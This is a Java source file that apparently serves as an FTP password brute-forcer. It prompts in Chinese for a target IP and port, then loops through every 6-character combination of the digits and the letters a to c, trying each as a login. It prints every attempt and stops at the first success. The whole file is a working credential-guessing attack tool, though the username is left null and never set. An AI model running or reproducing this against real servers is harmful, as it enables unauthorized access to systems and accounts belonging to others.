import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import java.io.IOException;
import java.net.SocketException;
import java.util.Scanner;

public class Test {
    static String[] pw = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c"};



    public static boolean check(FtpBean ftpBean) {
        boolean result = false;
        FTPClient ftpClient = new FTPClient();
        try {
            int reply;
            ftpClient.connect(ftpBean.getAddress(), Integer.valueOf(ftpBean.getPort()));
            ftpClient.login(ftpBean.getUsername(), ftpBean.getPasswd());
            reply = ftpClient.getReplyCode();
            System.out.println("状态码" + reply);
            if (!FTPReply.isPositiveCompletion(reply)) {
                ftpClient.disconnect();

            } else {
                ftpClient.disconnect();
                result = true;

            }
        } catch (SocketException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result;
    }

    public static void main(String[] args) {
        Scanner in = new Scanner(System.in);
        System.out.println("请输入测试的IP地址");
        String ip = in.nextLine();
        System.out.println("请输入用户的端口号");
        String port = in.nextLine();
        String username = null;
        int count = 0;
        boolean[] a = new boolean[1];
        for (int i1 = 0; i1 < pw.length; i1++) {
            for (int i2 = 0; i2 < pw.length; i2++) {
                for (int i3 = 0; i3 < pw.length; i3++) {
                    for (int i4 = 0; i4 < pw.length; i4++) {
                        for (int i5 = 0; i5 < pw.length; i5++) {
                            for (int i6 = 0; i6 < pw.length; i6++) {
                                String passwd = pw[i1] + pw[i2] + pw[i3] + pw[i4] + pw[i5] + pw[i6];
                                System.out.println("第" + count + "次尝试，密码为：" + passwd);
                                count++;
                                FtpBean ftp = new FtpBean();
                                ftp.setAddress(ip);
                                ftp.setPort(port);
                                ftp.setUsername(username);
                                ftp.setPasswd(passwd);
                                boolean result = check(ftp);
                                a[0] = result;
                                System.out.println(result);
                                if (a[0] == true) break;
                            }
                            if (a[0] == true) break;
                        }
                        if (a[0] == true) break;

                    }
                    if (a[0] == true) break;

                }
                if (a[0] == true) break;

            }
            if (a[0] == true) break;

        }
    }
}